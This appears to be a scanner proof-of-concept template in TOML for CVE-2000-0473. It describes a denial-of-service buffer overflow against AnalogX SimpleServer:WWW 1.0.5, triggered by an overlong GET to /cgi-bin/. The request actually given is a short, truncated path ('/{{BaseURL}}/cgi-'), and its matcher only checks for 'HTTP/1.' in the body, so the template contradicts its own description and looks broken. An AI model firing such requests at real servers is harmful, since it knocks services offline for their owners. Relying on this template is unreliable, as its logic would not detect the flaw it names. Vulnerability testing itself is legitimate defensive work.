[info]
author = "AVE"
description = "向 AnalogX SimpleServer:WWW 1.0.5 的 /cgi-bin/ 路径发送超长 GET 请求，触发缓冲区溢出导致服务进程崩溃，造成拒绝服务。需重启服务恢复。"
id = "POC-AVE-2000-0396"
name = "AnalogX SimpleServer:WWW 1.0.5 缓冲区溢出拒绝服务 PoC"
severity = "high"
tags = ["cve-2000-0473"]
vuln_id = [
    "CVE-2000-0473",
    "AVE-2000-0396",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["HTTP/1."]
